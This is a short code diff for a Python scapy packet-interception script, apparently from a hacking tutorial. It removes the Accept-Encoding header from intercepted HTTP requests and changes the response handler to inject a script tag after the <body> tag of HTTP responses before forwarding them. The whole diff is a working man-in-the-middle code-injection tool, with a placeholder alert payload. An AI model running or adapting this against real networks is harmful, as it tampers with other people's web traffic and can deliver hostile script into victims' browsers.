@@ -9,17 +9,21 @@ def set_load(packet, load):
     del packet[scapy.TCP].chksum
     return packet
 
+
+
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())  # This will convert the packet payload to scapy packet
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 80:
             print("[+] Request")
             modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
-            new_paket = set_load(scapy_packet, modified_load)
-            packet.set_payload(str(new_paket))
+            new_packet = set_load(scapy_packet, modified_load)
+            packet.set_payload(str(new_packet))
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+]Response")
-            print(scapy_packet.show())
+            modified_load = scapy_packet[scapy.Raw].load.replace("<body>", "<body><script>alert('Test')</script>")
+            new_packet = set_load(scapy_packet, modified_load)
+            packet.set_payload(str(new_packet))
     packet.accept()  # This will accept the packet and forward it to the client computer allowing him to go that particular website
 
 
